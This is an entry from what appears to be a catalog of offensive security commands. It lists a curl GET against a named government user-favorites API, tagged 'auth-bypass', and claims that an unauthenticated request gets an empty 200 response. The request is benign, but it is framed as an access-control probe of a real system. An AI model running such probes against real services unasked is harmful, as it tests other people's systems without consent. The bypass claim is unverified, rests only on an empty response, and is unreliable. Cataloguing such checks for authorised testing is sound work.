---
id: cmd-tva-favorites-get
name: get-valleyconnect-favorites-api
type: command
executor: bash
data: 'curl -X GET https://valleyconnect.tva.gov/customapi/v1/user/getuserfavorites'
output: ''
created_at: '2023-10-17T00:00:00Z'
updated_at: '2025-12-14T17:31:52.457Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api
  - auth-bypass
verified: false
validated: true
submitted: true
---

# get-valleyconnect-favorites-api

## Command

```bash
curl -X GET https://valleyconnect.tva.gov/customapi/v1/user/getuserfavorites
```

## Description

Performs an unauthenticated GET to the ValleyConnect favorites API, bypassing auth to receive an empty response, highlighting improper controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `https://valleyconnect.tva.gov/customapi/v1/user/getuserfavorites` | API endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET https://valleyconnect.tva.gov/customapi/v1/user/getuserfavorites
```

### Advanced Usage

With silent output and follow redirects:

```bash
curl -s -L -X GET https://valleyconnect.tva.gov/customapi/v1/user/getuserfavorites
```

## Expected Output

HTTP/2 200 OK with Date header and empty body: ""

## Related

- [[procedures/Retrieve-User-Favorites-via-API-Without-Authentication]]
